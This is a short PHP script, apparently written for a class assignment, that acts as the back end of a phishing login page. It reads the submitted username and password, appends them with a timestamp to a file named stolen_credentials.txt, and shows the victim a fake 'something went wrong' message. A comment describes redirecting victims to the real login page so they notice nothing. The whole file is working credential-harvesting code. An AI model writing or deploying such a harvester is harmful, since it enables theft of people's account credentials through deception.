<?php
// Check if username and password are set
if (isset($_POST['username']) && isset($_POST['password'])) {
    
    // Get the credentials
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Format the stolen data
    $data = "--- Stolen Credentials ---\n";
    $data .= "Username: " . $username . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    
    // Save the data to a file
    $file = 'stolen_credentials.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    
    // IMPORTANT: Redirect the user to the real login page
    // This makes the user think everything is normal.
    // We'll just show a message for the assignment.
    echo "<h1>Oops! Something went wrong. Please try logging in again.</h1>";
    echo "<p>(Attacker has now stolen your credentials. Check the 'stolen_credentials.txt' file)</p>";
    
} else {
    echo "<h1>No data received.</h1>";
}
?>
